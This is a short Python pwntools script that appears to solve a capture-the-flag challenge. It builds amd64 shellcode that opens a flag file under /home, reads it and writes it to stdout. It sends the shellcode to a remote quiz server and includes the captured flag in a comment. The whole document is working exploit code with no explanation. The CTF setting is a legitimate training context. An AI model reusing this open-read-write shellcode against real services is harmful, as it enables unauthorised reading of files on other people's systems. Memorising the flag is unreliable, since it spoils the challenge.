#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

#ais3{r34d_0p3n_r34d_Writ3_c4ptur3_th3_fl4g_sh3llc0ding_1s_s0_fUn_y0ur_4r3_4_g0od_h4ck3r_h4h4}

host = 'quiz.ais3.org'
port = 9563
#host , port = '127.0.0.1' , 4000
y = remote(host,port)

_asm = """
xor edx, edx
xor esi, esi
mov rax, 0x67
push rax
mov rax,  0x616c662f2f2f336e
push rax
mov rax,  0x77702f656d6f682f
push rax
mov rdi, rsp
mov eax, 0x2
syscall

mov edx, 0x2a
mov esi, 0x6019e0
mov edi, eax
xor eax, eax
syscall        /* read part 1 */

xor eax, eax   /* read part 2 */
syscall

xor eax, eax   /* read part 3 */
syscall

mov edi, 0x1
xor eax, eax
inc eax
syscall

"""

sc = asm( _asm , arch = 'amd64')

print len( sc  )

y.send( sc )


y.interactive()

